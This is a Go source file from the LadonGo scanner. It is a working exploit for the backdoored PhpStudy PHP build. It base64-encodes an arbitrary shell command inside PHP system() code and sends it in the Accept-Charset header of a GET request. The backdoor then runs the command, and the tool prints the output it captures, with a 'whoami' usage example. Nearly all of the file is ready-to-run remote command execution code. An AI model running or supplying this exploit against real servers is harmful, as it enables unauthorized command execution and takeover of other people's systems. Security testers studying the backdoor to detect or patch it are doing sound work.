package exp
//Ladon Scanner for golang 
//Author: k8gege
//K8Blog: http://k8gege.org/Ladon
//Github: https://github.com/k8gege/LadonGo
import (
	_"compress/gzip"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
)
var PhpStudyDoorHelp = func () {
    fmt.Println("Usage: Ladon PhpStudyDoor url cmd")
	fmt.Println("Example: Ladon PhpStudyDoor http://192.168.1.8 whoami")
}
//go run phpstudydoor.go http://192.168.1.21 whoami
//win7\k8gege
func PhpStudyDoorExp(url,cmdline string) {
	payload := "echo '<result>'; "+"system(\""+cmdline+"\");"+"echo '</result>';"
	encodeString := base64.StdEncoding.EncodeToString([]byte(payload))
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Accept-Charset", encodeString)
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println("error")
	}
	body, err := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(body))
	reg := regexp.MustCompile(`<result>(?s:(.*?))</result>`)
	if reg == nil {
		fmt.Println("regex error")
		return
	}
	str := string(body)
	result := reg.FindAllStringSubmatch(str,-1)
	for _, text := range result {
		fmt.Println(text[1])
	}
}